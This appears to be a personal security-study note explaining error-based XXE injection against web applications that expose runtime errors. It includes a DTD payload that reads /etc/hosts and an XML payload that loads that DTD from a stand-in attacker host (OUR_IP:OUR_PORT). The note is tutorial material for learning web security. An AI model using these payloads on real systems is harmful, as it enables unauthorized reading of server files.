If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.

First, we will host a DTD file that contains the following payload:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%entity;/%file;'>">
```
Open up a web server using Python to host the file, then call our DTD script as part of the payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:OUR_PORT/xxe.dtd">
  %remote;
  %error;
]>
<root>
	<name>&entity;</name>
</root>
```
This method may also be used to read source files. However, it is not as reliable as the [CDATA technique](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FXXE%20Injection%2FCommon%20XXE%20Attacks%2FAdvanced%20FIle%20Disclosures%2FAdvanced%20Exfiltration%20with%20CDATA) due to length limitations or certain special characters breaking it.